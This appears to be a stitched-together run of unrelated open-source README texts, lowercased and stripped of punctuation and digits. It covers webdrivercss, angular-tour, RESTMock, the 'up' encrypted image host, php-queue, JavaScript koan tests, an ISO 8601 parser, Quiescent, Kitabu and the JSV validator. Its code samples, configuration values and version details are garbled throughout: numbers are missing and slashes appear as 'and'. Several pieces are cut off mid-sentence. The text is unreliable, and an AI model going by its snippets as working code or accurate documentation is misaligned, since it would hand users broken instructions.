tumblrpage  name startpage  exclude x  y  x  y   screenwidth  if your exclude object has more then two xy variables it will try to form a polygon this may be helpful if you like to exclude complex figures like webdrivercss polygon  name startpage  exclude x  y  x  y  x  y  x  y  x  y  x  y  x y  x y   screenwidth  if you experience problems with unstable comparison results you might want to try tweaking the algorithm there are two options available colors and antialiasing colors might help you if you don t care about color differences on your page while the antialiasing option can for example reduce unexpected differences on font or image edges webdrivercss tumblrpage  name startpage  ignore antialiasing  screenwidth  note this doesn t affect the taken screenshots but only the comparison calculations by setting this option you reduce the sensitivity of the comparison algorithm though it s unlikely this might cause layout changes to remain unnoticed it is of course also important to check your design in multiple screen resolutions by using the screenwidth option webdrivercss automatically resizes the browser for you by adding the screen width to the file name webdrivercss makes sure that only shots with same width will be compared webdrivercss startpage  name header  elem masthead  screenwidth  this will capture the following image at once file name header px png file name header px png file name header px png note that if you have multiple tests running one after the other it is important to change the first argument passed to the webdrivercss command to be unique as webdrivercss saves time by remembering the name of previously captured screenshots and and example using mocha it should check the first page function done init and and make this name unique webdrivercss page  name test  screenwidth   name testtwo  screenwidth  end call done it should check the second page function done and and and and make this name unique webdrivercss page  and and and and if you want to have your image repository available regardless where you run your tests you can use an external api to store your shots therefor webdrivercss adds a sync function that downloads the repository as tarball and unzips it after running your tests you can call this function again to zip the current state of your repository and upload it here is how this can look like and and create a webdriverio instance var client require webdriverio remote desiredcapabilities browsername phantomjs and and initialise webdrivercss for client instance require webdrivercss init client screenshotroot myregressiontests  and and provide the api route init and and do your regression tests and and end this allows you to run your regression tests with the same taken shots again and again no matter where your tests are executed it also makes distributed testing possible regressions tests can be done not only by you but everyone else who has access to the api to implement such api you have to provide two routes for synchronization get and some and route and file should response the uploaded tarball for example and some and root and myproject tar gz content type application and octet stream post and some and route request contains zipped tarball that needs to be stored on the filesystem if you don t want to implement this by yourself there is already such an application prepared checkout it provides even a web interface for before and after comparison and stuff like this please fork add specs and send pull requests in lieu of a formal styleguide take care to maintain the existing coding style it installed or change the desiredcapabilities in the bootstrap js file under the test folder to your preferred driver e g  firefox you also need a web server to serve the site files and have the root folder set to webdrivercss we use the and path and to and webdrivercss repo and npm install g http server and path and to and webdrivercss repo and http server p  you ll also need a local selenium server running you can install

15447558, give an interactive tour to showcase the features of your website easy to use responsive to window resizes smoothly scrolls to each step control the placement for each tour tip has been tested in firefox internet explorer  and to install run bower install angular tour angular tour has a dependency on jquery once bower has downloaded the dependencies for you you ll need to make sure you add the required libraries to your index file also ensure that jquery is loaded prior to angular tour as it is a required dependency your script includes should look something like this you ll also probably want to include the default stylesheet for angular tour you can replace this with your own stylesheet lastly you ll need to include the module in your angular app angular module myapp  angular tour to begin your tour you ll need a tour element to contain all of your tour tips it must have a step attribute for binding the tour step to your scope add the tourtip attribute to whatever elements you want to add a tip to example markup tour step currentstep span tourtip tip  highlighted and span span tourtip tip  elements and span you can also add callbacks to the tour tour step currentstep post tour tourended post step stepcomplete tour complete tourcomplete tourended will be called always when tour will be ended completed or not tourcomplete will be called only when user will get to the last step stepcomplete will be called every time the step will be changed side note if you don t initialize currentstep in your controller it will be by default set to   which mean the tour won t appear on page load this is breaking change  as previously currentstep was defaulted to   which caused tour to start automatically it is very easy to add a cookie module that remembers what step a user was on using the angular cookie module this is all you need to integrate cookies and and load cookie or start new tour scope currentstep ipcookie mytour and and  and and save cookie after each step scope stepcomplete function ipcookie mytour  scope currentstep expires  there are additional attributes that allow you to customize each tour tip tourtip step default null tour tips play from step  onwards or in the order they were added you can specify a specific order e g span tourtip tip  tourtip step  and span span tourtip tip  tourtip step  and span span tourtip tip  tourtip step  and span tourtip next label default next the text for the next button tourtip placement default top placement of the tour tip relative to the target element can be top right left bottom on show default null callback which will be called when the tour step will appear on proceed default null callback which will be called when user move to the next step but just before showing it tourtip element default null css selector for element for which tourtip will be pointed if left null  tourtip will be pointed for itself use source scope default false option meaningful only when using virtual steps when set to false it will use as a target scope scope of target s element for evaluating on show and on proceed callbacks when set to true  target s scope will be scope when resides step itself see example below for a better explanation if you still need one tourtip container element default body element the tour tips are placed in especially practical when you have several scrollable containers you want to display tours in tourtip title default null title creates a separate h element to allow the separation of a title and it s content inside your tour you also have access to two scope methods for ending and starting the tour if you have more complicated structure of application especially with page divided by page includes and different controllers you can consider using this approach button class btn btn sm btn primary ng click localaction pff and button tour step currentstep virtual step tourtip content of the first step tourtip next label move forward tourtip placement bottom tourtip element magic button on show somerandomaction tourtip container element scrollablediv tourtip some other content tourtip next label faster faster tourtip placement top tourtip element other button on proceed localaction use source scope true tourtip container element scrollablediv name of the tag doesn t really matter it s a normal step definition but the element that will be used to attach to is specified by tourtip element attribute if you d like to edit the defaults for all your tour you can inject tourconfig somewhere into your app and modify the following defaults placement top  and and default placement relative to target top  right  left  bottom  center  center top animation true and and if tips fade in nextlabel next  and and default text in the next tip button scrollspeed  and and page scrolling speed in milliseconds margin  and and margin in pixels that the tip is from the target matches placement backdrop false and and should page dim out when the tour starts containerelement body and and default container element to parent tourtips to tourtip positioning can be controlled globally in the previously mentioned tourconfig service via the placement property top  right  bottom  center  center top  or via the tourtip placement attribute which will allow you to set the placement on an individual element by element basis the distance between a tourtip and the element it is attached to can either be set globally via tourconfig margin or on an individual element by element basis using the tourtip margin attribute the margin will always match the placement if the placement is top tourtip margin will add a margin between the tourtip and the top of the element there may be times especially when transcluding or applying to conditional elements where the tour tip s calculated xy position at compilation might not correspond to the element s current position in these cases you can use tourtip offset horizontal or tourtip offset vertical to override and adjust the positioning by a certain amount of pixels tour step currentstep tourtip hey i d like to walk you through our site it s great tourtip next label hmmm okay sure tourtip placement top tourtip margin  tourtip step  hi welcome to our site thing ng show currentstep  tourtip behold i am now explaining the feature tourtip next label wow amazing tourtip placement right tourtip offset vertical  tourtip offset horizontal  some cool feature sure does need some splaining tho dang as was already mentioned you can use your own css for styling the tour tips you can also use your own markup if you would like to replace the html template instead of using the angular tour tpls min js script use angular tour min js which doesn t include a template the easiest way to add your own template is to use the script directive script id tour and tour tpl html type text and ng template span class tour arrow tt ttplacement ng hide centered and span and div and script

thenreturnfile  users and defunkt json it s good to start server before the tested application starts there are few methods to make it simple you can just use the predefined restmocktestrunner in your ui tests it extends androidjunitrunner groovy defaultconfig  testinstrumentationrunner io appflate restmock android restmocktestrunner if you have your custom test runner and you can t extend restmocktestrunner  you can always just call the restmockserverstarter actually restmocktestrunner is doing exactly the same thing public class myapptestrunner extends androidjunitrunner override public void oncreate bundle arguments super oncreate arguments restmockserverstarter startsync new androidassetsfileparser getcontext new androidlogger  by default the restmocktestrunner uses androidassetsfileparser as a mocks file parser which reads the files from the assets folder to make them visible for the restmock you have to put them in the correct folder in your project for example and src and androidtest and assets and users and defunkt json this can be accessed like this restmockserver whenget pathcontains users and defunkt thenreturnfile  users and defunkt json if the response you wish to return is simple you can just specify a string restmockserver whenget pathcontains users and defunkt thenreturnstring  if you wish to have a greater control over the response you can pass the mockresponse restmockserver whenget pathcontains users and defunkt thenreturn new mockresponse setbody setresponsecode  addheader header  value you can either use some of the predefined matchers from requestmatchers util class or create your own remember to extend from requestmatcher the most important step in order for your app to communicate with the testserver you have to specify it as an endpoint for all your api calls for that you can use the restmockserver geturl if you use retrofit it is as easy as restadapter adapter new restadapter builder baseurl restmockserver geturl  build it is possible to verify which requests were called and how many times thanks to requestsverifier all you have to do is call one of these and and cheks if the get request was invoked exactly  times requestsverifier verifyget pathendswith users exactly  and and cheks if the get request was invoked at least  times requestsverifier verifyget pathendswith users atleast  and and cheks if the get request was invoked exactly  time requestsverifier verifyget pathendswith users invoked and and cheks if the get request was never invoked requestsverifier verifyget pathendswith users never restmock supports logging events you just have to provide the restmock with the implementation of restmocklogger for android there is an androidlogger implemented already all you have to do is use the restmocktestrunner or call restmockserverstarter startsync new androidassetsfileparser getcontext new androidlogger restmockserver enablelogging restmocklogger restmockserver disablelogging public

36991266, up a client side encrypted image host up is a simple host that client side encrypts images text and other data and stores them with the server knowing nothing about the contents it has the ability to view images text with syntax highlighting short videos and arbitrary binaries as downloadables public server this demo instance is no longer available or being maintained however there are several public hosts which use up an online search should turn up some results quick start to install and run the server with default settings apt get install nodejs cd up cp server and server conf example server and server conf cp client and config js example client and config js cd server npm install node server js listen is an address port formatted string where either one are optional some examples include  to listen on any interface port      to listen on localhost port       to listen on     port  or even to listen on any interface port  apikey is a very basic security measure requiring any client making an upload to know this key this doesn t seem very useful and should be revamped replace it with http auth maybe deletekey is a key used to secure the deletion keys set this to something that only the server knows maximumfilesize is the largest file in bytes that s allowed to be uploaded to the server the default here is a decimal mb there are three additional sections in the configuration file http  https and cloudflare cache invalidate the first two are fairly self explanitory and at least one must be enabled cloudflare cache invalidate is disabled by default and only useful if you choose to run the up server behind cloudflare when this section is enabled it ensures that when an upload is deleted cloudflare doesn t hold on to copies of the upload on its edge servers by sending an api call to invalidate it external tools sharex is a popular screenshot tool which supports tons of upload services not just for images but also for text video documents etc sharex includes a service which can send files to any up server it uses net bouncycastle for the crypto upclient is a cli tool which can send files or data to up servers either via unix pipe ps aux and up  or via argument up image png  and returns a url to the uploaded file on stdout it runs on nodejs and uses sjcl for the crypto how it works before an image is uploaded a seed is generated this seed can be of any length because really the server will never be able to tell  but has a length of  characters by default the seed is then run through sha giving the aes key in bytes   the ccm iv in bytes   and the server s file identifier in bytes   using this output the image data is then encrypted using said aes key and iv using sjcl s aes ccm methods and sent to the server with an identifier within the encryption there is also a prepended json object that contains metadata currently just the filename and mime type the decrypted blob format starts with  bytes denoting the json character length the json data itself and then the file data at the end image deletion functionality is also available when an image is uploaded a delete token is returned sending this delete token back to the server will delete the image on the server side hmac sha staticdeletekey identifier is used where the key is a secret on the server technologies the browser side is written in plain javascript using sjcl for the aes ccm encryption with entropy obtained using the webcrypto apis and encryption performed within a web worker the video and audio players just use the html players hopefully built into the browser the paste viewer uses highlight js for the syntax highlighting and line numbers the server side is written in node although we also have a go server which uses no dependencies outside of the standard library the only cryptography it uses is for generating deletion keys using hmac and sha in the built in crypto and hmac and crypto and sha packages respectively encryption and decryption are not streamed or chunked this means that at the time any download must fit fully in memory or the browser may crash this is not a problem with sub mb images but may be a problem if you want to share a long gameplay video or recorded meeting minutes we would love help and contributions even if they break backwards compatibilty by its very nature this uses cryptography in javascript there have been many reasons given as to why it s bad to use cryptography in javascript and some may be more valid than others we re working on browser extensions to mitigate some of these reasons and non javascript clients are always welcome  but safe to say that if you unconditionally believe that javascript crypto is bad you probably won t want to use this in the event of a breach of trust on the server the client could still be modified to read your decryption keys as a new project this code hasn t been audited by a trusted party since this is brand new there have been to date very few eyes on the code and even fewer trusted eyes on the code while we ve put as much effort as possible into offloading the hard crypto stuff to sjcl we still might have made a mistake somewhere reading over static and js and encryption js and letting us know if you find issues would be very helpful to us  and so for that reason using this software is at your own risk the server will in most cases receive referrer headers if a server decides to log requests they will also be able to receive referer headers for private and protected websites and direct links sent via im or email this isn t a big deal if the link is on a public website however it means the server owner might be able to find the original image unfortunately there s nothing that the software or server owner can do about this apart from hosting behind a cdn and offloading the referer header to the edge  however when posting a link you have a couple of options contributing any contributions whether to our existing code or as separate applications are very welcome we don t ask for any clas you don t have to give up copyright on your code however we prefer that you contribute under the mit license just for consistency if you find serious security issues please email us at security up ca some of us idle on irc freenode net in the upload channel if you would like to chat thank you for you contributions the up server and browser code are both licensed under mit sharex s base code is licensed under gplv however the modifications namely the c encryption code is licensed under mit upclient is licensed fully under mit

5727496, a unified front end for different queuing backends includes a rest server cli interface and daemon runners implementing a queueing system eg beanstalk amazon sqs rabbitmq for your application can be painful which one is most efficient performant learning curve to effectively implement the queue backend the libraries time taken to develop the application codes vendor locked in making it impossible to switch requires massive code change ie not flexible when use case for the queue changes php queue hopes to serve as an abstract layer between your application code and the implementation of the queue job queue is backend agnostic just refer to the queue by name what it runs on is independent of the application code your code just asks for the next item in the phpqueue jobqueue  and you ll get a phpqueue job object with the data and jobid flexible job queue implementation you can decide whether each phpqueue jobqueue only carries  type of work or multiple types of target workers you control the retrieval of the job data from the queue backend and how it is instantiated as a phpqueue job object each phpqueue job object carries information on which workers it is targeted for independent workers workers are independent of job queues all it needs to worry about is processing the input data and return the resulting data the queue despatcher will handle the rest workers will also be chainable powerful the framework is deliberately open ended and can be adapted to your implementation it doesn t get in the way of your queue system we ve build a simple rest server to let you post job data to your queue easily we also included a cli interface for adding and triggering workers all of which you can sub class and overwrite you can also include our core library files into your application and do some powerful heavy lifting several backend drivers are bundled memcache redis mongodb csv these can be used as the primary job queue server or for abstract fifo or key value data access installing via composer  download and install composer  install your dependencies php composer phar install  all the dependencies should be downloaded into a vendor folder  require composer s autoloader requireonce and path and to and vendor and autoload php you can have a look at the demo app inside vendor coderkungfu php queue src demo folder for a recommended folder structure htdocs folder htaccess index php queues folder queuenameincamelcase queue php workers folder workernameincamelcase worker php runners folder cli php file config php file i would also recommend putting the autoloader statement and your app configs inside a separate config php file recommended config php file content requireonce and path and to and vendor and autoload php phpqueue base queuepath dir and queues and phpqueue base workerpath dir and workers and altenative config php file you can also declare your application s namespace for loading the queues and workers requireonce and path and to and vendor and autoload php phpqueue base queuenamespace myfabulousapp queues phpqueue base workernamespace myfabulousapp workers php queue will attempt to instantiate the phpqueue jobqueue and phpqueue worker classes using your namespace appended with the queue and worker name ie myfabulousapp queues facebook if you declared phpqueue base queuepath and and or phpqueue base workerpath together with the namespace the files will be loaded with requireonce from those folder path and instantiated with the namespaced class names the default rest server can be used to interface directly with the queues and workers copy the htdocs folder in the demo app into your installation the index php calls the phpqueue rest defaultroutes method which prepares an instance of the respect rest rest server you might need to modify the path of config php within the index php file recomended installation use a new virtual host and map the htdocs as the webroot   add new job  trigger next job copy the cli php file from the demo app into your installation this file implements the phpqueue cli class you might need to modify the path of config php within the cli php file  add new job php cli php queuename add data boo bar  foo car  trigger next job php cli php queuename work you can extend the phpqueue cli class to customize your own cli batch jobs eg import data from a mysql db into a queue the queue backends will support one or more of these interfaces atomicreadbuffer this is the recommended way to consume messages atomicreadbuffer provides the popatomic callback interface which rolls back the popped record if the callback returns by exception for example queue new phpqueue backend pdo options queue popatomic function message use processor processor churn message the message will only be popped if churn returns successfully fifoqueuestore a first in first out queue accessed by push and pop this software is released under the mit license copyright c  michael cheng chi mun permission is

expressions function expressions as parameters functions general performance hoisting logical assignment namespaces numbers object prototype objects objects functionality prototypes strings switch block ternary conditionals truthy values variables   javascript and an array is a data structure with automatically indexed positions and it arrays can be accessed by indices  function and and the brackets indicate to the compiler to make an array and to fill it with and and the comma separated values between the brackets var arrayofstrings stringzero  stringone  stringtwo and and we can access any location of the zero based array expect arrayofstrings  tobe stringone it you can reference and change specific cells with indices  function var arrayofstrings stringone  stringone  stringtwo arrayofstrings  stringzero and and you can change the value contained at any index expect arrayofstrings  tobe stringzero functions  javascript and functions take some input then execute a series of statements using the input and outputs a result and it functions help write reusable code  function expect addnumbers   tobe  expect addnumbers   tobe  expect addnumbers  and   and  tobe  and and parameters can also be expressions which the function will resolve before starting var numberone  var numbertwo  expect addnumbers numberone numbertwo tobe  and and parameters can also be variables and and function keyword tells the compiler that you are defining a function function addnumbers numberone numbertwo and and the function s name follows the function keyword and should indicate the function s purpose and and parameters are passed in a set of parentheses before the first curly brace return numberone and numbertwo and and the return keyword works as a terminating statement and exits the function returning the value in front of it and and the statements that will be executed should be enclosed in curly braces  javascript it javascript uses binary floating point values to handle all of its decimal based operations  function expect   and   tobe   it you can use the tofixed method to select the amount of decimal places to display  function expect   and   tofixed  tobe   it tofixed method will round to the last indicated position  function and and   and     expect   and   tofixed  tobe   it parsefloat turns strings with decimals into numbers  function expect

converts it to decimal expect parseint  tobe  and and this is fixed on ecmascript it you can use a radix value to ensure correct parsing  function and and parseint will accept any radix value from   for selecting the base for the result expect parseint    tobe  anonymous closures  javascript and and when you create namespaces the program may still execute its private methods and variables and and it is good practice to use private methods to safely modify private data and and anonymous closures allow you to define public and private variables it closures will allow you to make private variables and properties  function and and you can achieve this by surrounding the entire set of properties and values in an immediately and and invoked function expression and and the local values and methods will be closed into the namespace var namespace function var privatearray    var privatevariable  and and in order to make public properties you can return an object return and and since the function expression is invoked this returned object will be handled immediately and and to the namespace variable and become a namespace publicarray function return    publicvariable  and privatevariable and and these parentheses indicate that the function expression should be immediately executed and and since privatearray and privatevariable are private we expect them to be undefined expect namespace privatearray tobeundefined expect namespace privatevariable tobeundefined expect namespace publicarray toequal    expect namespace publicvariable tobe  prototypes  javascript and class set of objects that inherit properties from the same prototype and it you can create constructors that allow to set up inheritance while also assigning specific property values  function and and capitalizing this function s name distinguishes it as a maker of an entire class of objects function person firstname lastname age and and this keyword inside a constructor will automatically refer to the new instance of the class that is being made this firstname firstname this lastname lastname this age age and and new keyword produces a new object of the specified class var martinperson new person martin  chavez   expect martinperson firstname tobe martin expect martinperson lastname tobe chavez expect martinperson age tobe  it you can assign a prototype to a constructor  function function person firstname lastname age this firstname firstname this lastname lastname this age age and and setting a constructor prototype property allows the instances to access these properties person prototype address house  var martinperson new person martin  chavez   and and there is no need to define the address for each person expect martinperson address tobe house  it you can modify the message functions in a prototype to use the data values in the calling instance  function function person firstname lastname this firstname firstname this lastname lastname person prototype and and this keyword searches for the particular object person that called the inherited function and retrieves the data from it fullname function return this firstname and and this lastname var martinperson new person martin  chavez expect martinperson fullname tobe martin chavez it you can use prototype chaining to reuse functionality  function function person firstname lastname this firstname firstname this lastname lastname this blackhair true function baby firstname lastname and and you can call the person constructor within the baby constructor person call thisfirstname lastname and and we need to add a reference to this object constructor otherwise it will use the person constructor this constructor baby and and by setting a parent object as a constructors prototype

methods the one that contains the actual parser is isodateformatter datecomponentsfromstring timezone range the other five are based on this one the  outtimezone  parameter when not set to null  is a pointer to an nstimezone variable if the string specified a time zone you ll receive the time zone object in that variable if the string didn t specify a time zone you ll receive nil the  outrange  parameter when not set to null  is a pointer to nsrange storage you will receive the range of the parsed substring in that storage create an iso  date formatter then call formatter stringfromdate mydate the method will return a string the formatter has several properties that control its behavior you can set the format of the resulting strings by default the formatter will generate calendar date strings your other options are week dates and ordinal dates you can set a default time zone by default it will use nstimezone defaulttimezone you can enable a strict mode wherein the formatter enforces sanity checks on the string by default the parser will afford you quite a bit of leeway you can set whether to include the time in the string and if so what hour minute separator to use default update from the year  conversion from the old make based test monsters to modern ocunit based tests is underway contributions of new and old test cases will be greatly appreciated make test will perform all tests if you want to perform only some tests type make parser test make will build the test program testparser  then invoke testparser sh py to generate testparser sh then make will invoke testparser sh which will invoke the test program with various dates if you don t want to use my tests make testparser will create the test program without running it you can then invoke testparser yourself with any date you want to if it doesn t give you the result you expected contact me making sure to provide me with both the input and the output type make unparser test make will build the test programs then invoke testunparser sh this shell script invokes each test program for   of every year from  to  writing the output to a file and then runs diff qs between that file testunparser out and a file testunparser expected out containing known correct output diff should report that the files are identical three test programs are included unparse date unparse weekdate and unparse ordinal date if you don t want to use my tests you can make these test programs separately each takes a date specified by iso  parsed with my own iso  parser  and outputs a string that should represent the same date this version is   changes from   watchos is now officially supported bacbc dea abeb thanks neil daniels tvos is now officially supported bbe thanks boris bu gling carthage is

generation one subtraction could give a negative result which was a problem because my implementation of the algorithm used unsigned integers i ve changed it to use signed integers so the result truly is negative now i also added a test case for this changes in   from   added the ability to use a time separator other than changes in   from   colin barrett noticed that i used m instead of m when creating the time strings oops colin also noticed that i had the in isodatestringwithtime the wrong way around oops again changes in   from   the unparser is new the has been munged to allow both components together the parser has not changed whitespace before a date and anything after a date is ignored thus t and all s well is a valid date for the purpose of this method yes t is a valid iso  date it means    or  pm all of the frills of iso  are supported except for extended dates years longer than  digits specifically you can use week based dates  w for the second week of   ordinal dates   for december   decimal minutes        and decimal seconds     all methods of specifying a time zone are supported iso  leaves quite a bit up to the parties exchanging dates i hope i ve chosen reasonable defaults for example note that i m writing this on    if the month or month and date are missing  is assumed     if the year or year and month are missing the current ones are assumed          in the case of week based dates with the day missing this implementation returns the first day of that week  w is     w is    etc for any date without a time midnight on that date is used iso  permits the choice of either t or t for midnight this implementation uses t t will get you t on the following day if no time zone is specified local time as returned by nstimezone localtimezone is used none of the above defaults apply if you re using the nsdatecomponents based api when a date is parsed that has a year but no century this implementation adds the current century the implementation is tolerant of out of range numbers for example   t     am on    notice that the month    date    hour    minute    and second   are all out of range as mentioned above there is a strict mode that enforces sanity checks in particular the date must be the entire contents of the string and numbers are range checked if you have any suggestions on how to make this mode more strict please file an enhancement request in the issues section this method won t extract a date from just anywhere in a string only immediately after the start of the string or any leading whitespace there are two solutions either require you to invoke the parser on a string that is only an iso  date with nothing before or after bad for parsing purposes  or make the parser able to find an iso  date as a substring i won t do the first one and barring a patch i probably won t do the second one either date ranges also specified by iso  are not supported this method will only return one date to handle ranges would require at least one more method there is no method to analyze a date string and tell you what was found in it year month week day ordinal day etc feel free to submit a patch this project adheres to the contributor covenant version   code of conduct md please read that before deciding whether you are willing to contribute please don t break compatibility with old os versions os x   and ios  until work begins on the   release that won t happen until   is done and starting   only work e g  arcification early will lead to conflicts adding test cases is highly encouraged especially if adding new functionality ideally please test a comprehensive set of success cases failure cases exception programmer error cases even if something isn t supported the behavior should still be reliable and preferably diagnostically helpful travis ci will run the tests automatically when you submit a pull request and a pr with failing tests will not be accepted contributions consisting of nothing but test cases are welcome if one and some of those cases fail please include fixes or at least submit an issue report for the failure s and surround the failing tests with if fixed issue number void

16621691, a lightweight clojurescript abstraction over reactjs emphasizing its ability to re render immutable values efficiently see the documentation docs md for instructions and examples of how to use quiescent reactjs is an extremely interesting approach to ui rendering for html based web applications its core value proposition is to make it possible to write one set of ui rendering code that works for both initial creation and any future updates updates are extremely efficient because only the minimal set of necessary deltas are actually sent to the dom in other words react lets you write your ui code once  and still have a dynamic data driven application ideally it eliminates any need to write explicit ui manipulation code instead you are responsible only for supplying a specification of what the ui should look like given certain data the reactjs implementation takes care of all the details of how to morph the existing dom to correspond to changes in the input data quiescent is intended to expose this feature and only this feature in a way that is convenient and idiomatic to clojurescript while remaining highly efficient it has the following design goals single concern quiescent is designed to do one thing render and re render html from immutable values it does not attempt to participate in state management inform how you organize your application or force the use of any specific technique for managing state updates feel free to use atoms watchers core async compilation based models message passing etc the only requirement is that values passed to quiescent components are immutable value types avoid oo idioms reactjs is itself highly object oriented with stateful objects that may implement a variety of behaviors quiescent provides a purely functional interface allowing users to construct a reactjs component tree using only the basic tools of functional programming function definition and composition top down rendering all renders and updates are initiated by instructing quiescent to render a particular value to a particular location in the dom individual tree components do not maintain their own state and do not re render themselves unless explicitly directed to do so this is intended to emulate classical rendering semantics for d or d bitmapped applications where the entirety of a scene is re drawn from scratch for every frame of course react and quiescent does not actually do this for performance reasons but the fact that it does not is an implementation detail the conceptual model is the same leverage immutability by assuming that any value provided to a rendered component is immutable quiescent can prevent reactjs from even calculating if it needs to render sub trees that have not changed from the last time the application was updated since equality checks are highly efficient in clojurescript large application structures can be re rendered frequently with almost no performance hit apart from that necessary to re render leaf nodes that actually did change compatibility although you will hopefully be able to write the vast majority of your application using quiescent s model you can if necessary always fall back and use a raw reactjs component or for that matter a reactjs component constructed using another clojurescript interface this is possible at any level of the rendering component tree these goals differ slightly from other clojurescript interfaces to react as described below interface to reactjs highly capable and well designed it provides categorically more features than quiescent at the cost of taking more control and specifying more rigidly the way application state is modeled updated and re rendered the most important conceptual distinctions are to create an om component you must implement a protocol due to its relative lack of capability quiescent only requires components to provide a single render function om controls the primary application state atom and how it is updated in quiescent this is entirely the responsibility of the consumer om explicitly allows components to maintain local state while quiescent forbids this in my opinion the benefits of requiring components to account for local state do not justify the pervasive cost to implementation specifically addressing the two reasons david nolen gives for allowing application state   local state pollutes application data  an alternative view is that all data is application data whether it is transient or persistent important or insignificant wherever it is actually located there is little harm in including it in the top level data structure and if your application does demand a hierarchy of data persistent vs transient etc for different purposes it is better to model that relationship explicitly rather than leaving transient data tucked invisibly away in component state   local state is always up to date  this is not relevant in quiescent s render model because quiescent does not manage state om components are always aware of their location in the primary application state via a cursor a hybrid of functional zippers and lenses quiescent components are not this means that om components can dispatch updates to themselves  whereas a dom event handler function attached to a quiescent component can only effect change by reaching back and doing something to the top level application state e g  by sending a core async message swapping the top level atom etc this does somewhat negate the concept of component modularity quiescent s contention is that the benefit of top down value based rendering exceeds that of truly modular components ultimately though om is an excellent well thought out library and if your needs or design goals more closely align with its capabilities than with quiescent you should absolutely use it wrapper for reactjs it is perhaps easier than either om or quiescent and certainly the most readable of the three the key differences between reagent and quiescent or om for that matter are reagent defaults to a component definitions reagent handles updates via a special version of an atom a reactive atom or ratom whenever a component references a ratom watches are established such that the component will re render when the value of the ratom changes as such reagent components are not driven by top down data or a singular application state but by whatever ratoms are referenced in their definition reagent like om maintains full control of the render and re render cycle although i do not have as much first hand experience with reagent it seems to be a very convenient approach and if it meets your needs you should definitely give it a try this section presumes familiarity with how reactjs works in short basic quiescent components implement only two of reactjs s component lifecycle events  shouldcomponentupdate is always predicated exclusively on whether the immutable value passed to the component constructor function has changed if so the component re renders if not it doesn t  the implementation of render is provided as a function supplied by the user the output of this render function is presumed to be a single reactjs component as it is in vanilla reactjs the function however is passed the immutable value that was used to construct the function it is also passed any additional arguments that were provided to the component constructor information on reactjs and how it works upgrade to react     ignore mask from cljs core to avoid compiler warning  add newly supported svg tags which react supports  upgrade to react    use symbol name for defcomponent as default react component name  make it easier to idiomatically use react components defined elsewhere for example react bootstrap inspired by  warning this release contains breaking changes breaking change the primary namespace has been renamed from quiescent to quiescent core to avoid a single segment namespace which could cause a variety of problems breaking change quiescent now includes a transitive dependency to reactjs using clojurescript s new expanded foreign library support do not need to and should not include reactjs either in your clojurescript preamble nor in your html support for new versions of reactjs the wrapper functionality is deprecated see explanation below instead you can now supply explicit lifecycle hooks when defining components keys are now supported on custom components added support for naming custom components which will be helpful for debugging including the debugging browser extensions provided by reactjs added an examples directory added support for uncontrolled inputs fixes  and  as it turns out there is no way in the current model that wrappers can provide the desired functionality in all cases a wrapper component can only modify its own lifecycle methods not truly those of its child but neither can it access the shouldcomponentupdate of the child it must have a shouldcomponentupdate that constantly returns true therefore an onrender wrapper would fire even if the wrapped component explicitly did not render due to an unchanged value or otherwise overriding shouldcomponentupdate issue  wrapper components now copy the key property from their wrappee issue  define a map of generated dom functions this useful for programmatically generated uis issue  allow specification of multiple lifecycle handler functions using the same wrapper component see documentation on quiescent and wrapper project no longer has reactjs as a leiningen dependency

export and your book will be created on the output directory kitabu can generate a table of contents toc based on your h h tags the h tag is discarded because it s meant to be the book title to print the toc you need to print a variable called toc  using the erb tag toc you can also have md erb files you can mix markdown and html like the following this the chapter title note do make sure you try md erb files end the above content must be placed in a md erb file the generated content will be something like this the note helper is built in and can accept a different note type note warning do make sure you write valid erb code end you can see available helpers on to highlight code use fenced code blocks ruby class user activerecord base validatespresenceof login password email

797504, jsv json schema validator  jsv is a javascript implementation of a extendable fully compliant json schema validator with the following features the fastest extendable json validator available complete implementation of all current json schema draft revisions supports creating individual environments sandboxes that validate using a particular schema specification provides an intuitive api for creating new validating schema attributes or whole new custom schema schemas supports self  full and describedby hyper links validates itself and is bootstrapped from the json schema schemas includes over  unit tests for testing all parts of the specifications works in all ecmascript  environments including all web browsers and node js licensed under the freebsd license a very open license a json validator is a program that takes json data and with a provided schema will ensure that the provided json is structured in the way defined by the schema this ensures that if validation has passed the json instance is guaranteed to be in the expected format it will also provide an explanation on why a particular instance failed validation here s an example on how to validate some json with jsv var jsv require and jsv jsv var json var schema type object var env jsv createenvironment var report env validate json schema if report errors length  and and json is valid against the schema another example for the following test env validate a   type object  properties a type string the generated report would look like errors message instance is not a required type  uri urn uuid

and a urn uuid fdefe bd  a aada and properties and a  instance jsoninstance object  schema jsonschema object  schemaschema jsonschema object there is no one way to validate json just like there is no one way to validate xml even the json schema specification has gone through several revisions which are not  backwards compatible with each other to solve the issue of using numerous schemas already written to older specifications jsv provides customizable environments to validate your json within when creating an environment you can optionally specify how you want that environment to behave for example this allows you to specify which version of the json schema you would like the environment to behave like jsv already provides the following environments json schema draft  optional has been replaced by required requires has been replaced by dependencies minimumcanequal and maximumcanequal has been replaced by exclusiveminimum and exclusivemaximum self and full and describedby links have been moved to the core schema and are provided by id and ref and schema adds the attributes patternschema and additionalitems deprecates the attributes root and alternate in addition to this all schemas from the previous versions of the json schema draft are included in this environment and are backwards compatible where possible with it s previous version this backwards compatibility can be disabled with the environment option strict is set to true this is currently the default environment json schema draft  targetschema attribute slash delimited fragment identifiers which is now the default behavior json schema draft  users with json schemas written for jsv v  should use this environment for it s dot delimited fragment identifiers environments can also be customized and registered for multiple reuse see the section on extending environments below the following methods are used to validate json data environmentid lt string gt optional the id of the environment to clone a new environment from creates an new environment that is a copy of the environment registered with the provided environmentid if no id is provided the latest registered json schema is used as the template see the above section on environments for the default available environment ids json lt any and jsoninstance gt the json data to validate schema lt object and jsoninstance and jsonschema gt the schema to validate the json with validates both the schema and the json and returns a report of the validation an array of error objects from the validation process each object represents a restriction check that failed if the array is empty the validation passed the error objects have the following schema type object  properties message description a user friendly error message about what failed to validate  type string uri description uri of the instance that failed to validate  type string  format uri schemauri description uri of the schema instance that reported the error  type string  format uri attribute description the attribute of the schema instance that failed to validate  type string details description the value of the schema attribute that failed to validate  type any there are many more apis available for jsv too many to detail here the complete api and documentation can be found in the docs directory jsv provides an api for extending available schemas adding new attributes and validation to currently existing schemas and creating whole new environments with unique behaviors details and instruction on this feature will be provided at a later date the preferred method of installation is to download the latest copy from github git clone git and and github com and garycourt and jsv git if you are using jsv within node js you can quickly install it using npm install jsv then you can reference it within your application using var jsv require jsv jsv open tests and index html and tests and index html in your web browser to run the unit tests

last three type examples we define formfield s recursively as objects or arrays of arbitrarily nested formfield s each of which can have all of the same metadata as top level fields like default

